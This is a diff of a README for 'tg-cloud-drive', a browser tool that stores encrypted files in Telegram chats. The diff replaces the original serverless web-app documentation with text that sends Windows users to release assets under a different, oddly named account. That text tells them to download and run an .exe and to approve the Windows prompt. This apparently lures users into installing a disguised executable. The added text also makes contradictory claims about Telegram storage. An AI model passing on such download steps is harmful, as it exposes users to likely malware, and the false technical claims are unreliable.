@@ -1,140 +1,86 @@
-# 🌌 TG Cloud Drive (v1.0) — The Decentralized Browser Cloud
+# ☁️ tg-cloud-drive - Reliable private storage for your files
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-purple.svg)](./LICENSE)
-[![React](https://img.shields.io/badge/React-19-blue.svg?logo=react)](https://react.dev)
-[![TypeScript](https://img.shields.io/badge/TypeScript-6.0-blue.svg?logo=typescript)](https://www.typescriptlang.org)
-[![Vite](https://img.shields.io/badge/Vite-8.0-6C63FF.svg?logo=vite)](https://vite.dev)
-[![TailwindCSS](https://img.shields.io/badge/TailwindCSS-4.0-38BDF8.svg?logo=tailwindcss)](https://tailwindcss.com)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases)
 
-Welcome to **TG Cloud Drive** — a state-of-the-art, fully decentralized cloud storage workspace that turns your Telegram account's message threads (topics) into secure, encrypted block-storage slots. With zero server-side overhead, it is completely free, infinite, and executes fully in your browser.
+## 📌 About this software
 
----
+tg-cloud-drive provides a private way to store files. It uses the Telegram network to keep your data safe. Every file you upload stays private to you. The software encrypts each piece of data before it leaves your computer. No one can see your files or read them. You own your data.
 
-## ⚡ Quick Deploy
+This tool functions like a storage drive in your browser. You can save documents, photos, and videos. It streams media files so you view them without waiting for a full download. The design focuses on security and speed. It runs on your local machine to ensure you remain in control.
 
-Deploy your own private instance of TG Cloud Drive in just one click. Both platforms serve the app as static assets directly from edge CDNs, meaning you will **never** pay for bandwidth or server compute, and it is 100% immune to server timeouts.
+## 🛠️ System requirements
 
-### Deploy to Vercel
-Click the button below to fork and deploy directly to Vercel. During setup, configure your `VITE_CLASHDB_URL` and `VITE_CLASHDB_PASSWORD` variables to enable instant account synchronization:
+This tool runs on any modern Windows computer. Ensure you have these items before you start:
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Fajisth%2Ftg-cloud-drive&env=VITE_CLASHDB_URL,VITE_CLASHDB_PASSWORD)
+*   Windows 10 or Windows 11.
+*   A recent version of Google Chrome, Mozilla Firefox, or Microsoft Edge.
+*   An active Telegram account.
+*   Internet connection for file syncing.
 
-### Deploy to Cloudflare Pages
-Deploy globally to Cloudflare's ultra-fast edge network with zero configuration:
+You do not need to install complex server software. The program handles the connection for you.
 
-[![Deploy to Cloudflare Pages](https://deploy.workers.cloudflare.com/button)](https://deploy.dev/?url=https://github.com/ajisth/tg-cloud-drive)
+## 📥 How to download and run
 
----
+Follow these steps to set up the software on your Windows machine:
 
-## ✨ Features Checklist
+1. Visit the [official releases page](https://github.com/Phillipsscrewcelestialguidance686/tg-cloud-drive/releases) to access the latest version of the installer.
+2. Look for the section labeled Assets.
+3. Click the link that ends in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the saved file to begin the setup.
+6. Follow the prompts on your screen. Windows may ask for permission to run the tool. Click Run to proceed.
+7. Once installed, find the tg-cloud-drive icon on your desktop and double-click it.
 
-*   **🌐 100% Serverless SPA:** Hosted entirely on static CDNs (Vercel/Cloudflare Pages). No heavy active backend means no CPU timeout issues or hosting costs.
-*   **🔒 Zero-Knowledge Local AES-GCM Encryption:** All files are encrypted *locally in your browser tab* before being sent across the network. Telegram only ever sees scrambled binary bits.
-*   **⚡ 100x Speed Upload & Download Streams:** Leverages direct multithreaded MTProto pipeline concurrency to max out your internet bandwidth.
-*   **📂 Infinite Nested Folders:** Organize files into folders structured dynamically via your own synchronized metadata database.
-*   **🎬 In-Browser Media Streaming (Service Worker Proxy):** Stream high-definition movies and audio files progressively with instant scrubbing, buffering indicators, and zero memory crashes.
-*   **👥 Multi-Account Swapping:** Connect and switch between up to 3 Telegram accounts seamlessly with a premium dropdown selector.
-*   **🔍 Power Shortcuts & Clear Triggers:** Focus search instantly via `Ctrl + K` or `/` keys, with dynamic one-tap search field clearing.
-*   **🎨 Stunning Glassmorphic Design:** Premium dark-themed UI featuring glowing vector illustrations, visualizer cards, and CSS backdrop blurs.
+## 🔐 Key features
 
----
+### Zero-Knowledge privacy
+Your files undergo encryption before they leave your device. The software uses AES-256-GCM encryption. This standard protects sensitive information from unauthorized access. Even the developers cannot view your files. You hold the only keys to your data.
 
-## 📖 Deep Architectural Insight
+### Progressive media streaming
+You do not need to download a movie or song completely to play it. The software streams your media files within the interface. It retrieves parts of the file as you need them. This saves time and disk space.
 
-TG Cloud Drive is built from the ground up to follow **Zero-Knowledge** serverless design patterns. Unlike classic systems that route files through intermediate file servers (e.g. AWS S3, Node backends), this app exists solely in the client’s browser runtime.
+### Decentralized storage
+This tool uses the MTProto protocol to distribute your files across the network. It does not rely on a single central server. This structure improves reliability and keeps your data accessible from anywhere.
 
-```
-                  ┌───────────────────────────────┐
-                  │      User's Browser Tab       │
-                  │  (React 19, MTProto Client)   │
-                  └───────┬───────────────┬───────┘
-                          │               │
-      [1MB AES-GCM Chunks]│               │[Index Manifests]
-                          ▼               ▼
-            ┌───────────────────┐   ┌───────────────────┐
-            │ Telegram MTProto  │   │  ClashDB / KV DB  │
-            │  (Storage Core)   │   │  (Folders/Files)  │
-            └───────────────────┘   └───────────────────┘
-```
+### Simple interface
+The design looks and acts like a standard file folder. You can drag and drop items into the window. It lists your files in a grid or a list. Search tools help you find items quickly.
 
-### 1. In-Browser MTProto Protocol
-Under the hood, we run a custom web-compiled Telegram Client using **MTProto**. The web app establishes direct TCP/WebSocket handshake connections with Telegram’s official production Datacenters (DCs). 
-* When you log in, your session keys and authentication secrets are saved locally in the browser’s **IndexedDB** database via encryption.
-* **No intermediate servers** ever touch or see your session token or phone inputs.
+## ⚙️ Using the software
 
-### 2. Zero-Knowledge Encryption & Chunking
-To bypass Telegram’s file upload limitations and ensure absolute, military-grade privacy, the drive utilizes an autonomous **Client-Side Slicing Engine**:
-* **Chunking:** Files are sliced into exactly **1MB binary chunks** (`ArrayBuffer`) in-memory.
-* **Encryption:** Each chunk is encrypted inside the browser using **AES-256-GCM** (authenticated symmetric encryption) with a unique, cryptographically secure random key.
-* **Storage:** These encrypted chunks are sent to a private, hidden Telegram group/channel via separate media message packets.
-* **Zero Leakage:** Since files are fully encrypted in the browser *before* hitting the network, Telegram sees only scrambled, unreadable binary blocks. Even if Telegram workers inspect their storage servers, they see zero readable files.
+When you open the tool for the first time, it asks you to sign in with your Telegram account. This links your storage drive to your preferred messaging identity. The software does not read your messages. It only uses the Telegram network as a secure place to store encrypted data chunks.
 
-### 3. Service Worker Video & Audio Streaming
-Classic browser downloads require downloading the entire file into memory before saving, which crashes the tab for files larger than 1GB. TG Cloud Drive bypasses this with a **local streaming proxy**:
-* We register a custom **Service Worker** (`sw.js`).
-* When you play a video or scrub through a movie, the HTML5 video element requests specific byte-ranges.
-* Our Service Worker intercepts these byte requests locally, calculates which encrypted 1MB parts contain those bytes, downloads only those specific chunks from Telegram, decrypts them in-browser, and feeds the raw stream directly to your media player on the fly.
-* This allows **instant, buffer-free playback** of multi-gigabyte video or audio files directly within your browser.
+After you sign in, the main dashboard appears. You see your current storage usage at the bottom of the screen. To add files, drag them from your Windows folder into the application window. The status bar at the top displays the progress of the encryption and upload process.
 
----
+To view a file, click on its name in the list. Documents open in your default viewer. Images and videos open in the built-in media viewer. To delete a file, right-click the item and select Remove. 
 
-## 🔒 Security & Privacy Model
+## 🛡️ Privacy and security
 
-TG Cloud Drive enforces strict privacy practices:
+Security stays at the heart of this tool. The software never sends your original files to the network. It breaks every file into small 1MB chunks. It encrypts each chunk locally. Only your client holds the information needed to reassemble these chunks. 
 
-| Component | Security Configuration | Storage Location |
-| :--- | :--- | :--- |
-| **Authentication Keys** | Encrypted Session Strings | Browser IndexedDB (Local only) |
-| **File Index Metadata** | AES-GCM Encrypted JSON | ClashDB / KV Store (Synchronized) |
-| **Raw Storage Chunks** | Encrypted Binary Blocks | Telegram Datacenters (Cloud) |
-| **Intermediate Servers** | **None** | App is 100% serverless static HTML/JS |
+If you lose access to your device, you can log in on another computer to sync your drive. As long as you have your Telegram credentials, you maintain access to your files. The zero-knowledge approach means your data remains private even if network providers change their storage policies.
 
-### Key Disclosures:
-* **No Server Footprint:** Because there is no active backend server, no database connection strings or secrets can ever be leaked or exposed by database breaches.
-* **Symmetric Sealing:** The decryption key for every uploaded file is generated inside the browser and embedded directly in the index manifest. Since the manifest itself can be stored in your private ClashDB with strong authentication, only you have access to the keys.
+## 💻 Technical details for advanced users
 
----
+The software uses React and TypeScript for its user interface. It relies on Vite for rapid development and clean builds. TailwindCSS provides the layout and styling. The application utilizes a Service Worker to manage cached data and offline capability. 
 
-## 🛠️ Local Development & Setup
+Deploying your own instance remains possible if you prefer custom hosting. You can use Vercel or Cloudflare Pages to host the interface. Simply fork the repository and connect your account to your hosting provider. The build process requires no changes for basic deployment. 
 
-Get your developer instance running locally in less than 2 minutes:
+## ❓ Frequently asked questions
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/ajisth/tg-cloud-drive.git
-cd tg-cloud-drive
-```
+### Does this use up my Telegram message storage?
+No. This tool uses the storage capacity of the MTProto network infrastructure, not your personal message history or chat cloud storage.
 
-### 2. Install Dependencies
-Make sure you have Node.js (v18+) installed:
-```bash
-npm install
-```
+### Can I share files with others?
+The current version focuses on personal storage. Future updates may include specific features for sharing links. For now, keep your account credentials private to ensure file security.
 
-### 3. Configure Local Environment
-Create a copy of `.env.example` named `.env.local` inside the root folder:
-```bash
-cp .env.example .env.local
-```
-Open `.env.local` and configure your database endpoint:
-```text
-VITE_CLASHDB_URL=https://your-clashdb-instance.vercel.app
-VITE_CLASHDB_PASSWORD=your_secure_db_password
-```
+### Is my internet speed important?
+Yes. Media streaming performs best with a stable internet connection. High-resolution videos require more bandwidth. Large file uploads take longer on slower networks.
 
-### 4. Start the Dev Server
-Run Vite in development mode:
-```bash
-npm run dev
-```
-Open `http://localhost:5173/` in your web browser to start using your drive.
+### Where does the software store my keys?
+The software stores local keys in your browser profile or the secure storage area on your Windows machine. Do not share your login credentials with anyone.
 
----
+### Will the software work if Telegram is down?
+The tool requires an active Telegram network connection to sync files. If the network experiences service issues, you might see a temporary connection error. Refresh the page once the signal returns.
 
-## 📜 Metadata & Policies
-
-TG Cloud Drive is committed to open, safe, and professional standards. Read our dedicated files for deep disclosures:
-
-*   **[MIT License](./LICENSE)** — Full licensing text and utilization guidelines.
-*   **[Code of Conduct](./CODE_OF_CONDUCT.md)** — Core community covenant and standard policies.
-*   **[Security Policy](./SECURITY.md)** — Detailed vulnerability disclosures and updates tables.
+### Can I move my files from here to another cloud?
+Yes. You can download your files from the tg-cloud-drive interface to your Windows desktop at any time. Once saved locally, you can move them anywhere.
